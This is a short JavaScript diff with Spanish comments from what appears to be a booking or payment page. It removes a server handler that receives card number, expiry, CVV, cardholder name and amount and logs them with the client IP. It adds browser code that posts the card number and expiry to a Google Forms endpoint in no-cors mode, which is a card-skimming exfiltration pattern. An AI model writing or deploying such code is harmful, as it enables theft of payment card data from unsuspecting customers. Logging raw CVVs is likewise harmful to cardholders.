@@ -1,28 +1,14 @@
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ status: 'error', message: 'Método no permitido' });
-  }
+const formData = new FormData();
+formData.append('entry.196dz2nRuj-voqEiLxkqcK62GtRZHVh9NBLve3uESsYk', number); // reemplaza con el id real
+formData.append('entry.0987654321', exp);
+// ... otros campos
 
-  const data = req.body;
-
-  if (!data || !data.cardNumber || !data.expiration || !data.cvv || !data.cardHolder || !data.amount) {
-    return res.status(400).json({ status: 'error', message: 'Datos incompletos' });
-  }
-
-  // Aquí podrías agregar validaciones adicionales o guardar en base de datos
-
-  // Obtener IP cliente
-  const remote_ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
-  // Crear registro (aquí solo lo mostramos en consola)
-  const logEntry = {
-    timestamp: new Date().toISOString(),
-    remote_ip,
-    payload: data
-  };
-
-  console.log('Reserva recibida:', logEntry);
-
-  // Responder éxito
-  return res.status(200).json({ status: 'success', message: 'Datos recibidos correctamente' });
-}
+fetch('https://docs.google.com/forms/d/e/FORM_ID/formResponse', {
+  method: 'POST',
+  mode: 'no-cors', // importante para evitar CORS
+  body: formData
+}).then(() => {
+  alert('Datos enviados a Google Forms');
+}).catch(() => {
+  alert('Error al enviar datos');
+});
